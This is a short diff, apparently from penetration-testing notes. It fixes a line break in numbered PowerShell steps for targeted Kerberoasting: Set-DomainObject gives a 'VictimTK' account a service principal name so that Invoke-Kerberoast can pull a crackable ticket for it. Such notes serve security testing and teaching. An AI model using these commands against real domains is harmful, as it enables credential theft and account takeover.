@@ -1042,8 +1042,7 @@ $cred = New-Object System.Management.Automation.PSCredential($username,$password
 Invoke-Kerberoast
 
 3. Set DomainObject on the VictimTK Account.
-Set-DomainObject -Identity VictimTK -Set @{serviceprincipalname='B
-ANK/myspn'} -Credential $cred
+Set-DomainObject -Identity VictimTK -Set @{serviceprincipalname='BANK/myspn'} -Credential $cred
 
 4. Checker (After)
 Invoke-Kerberoast
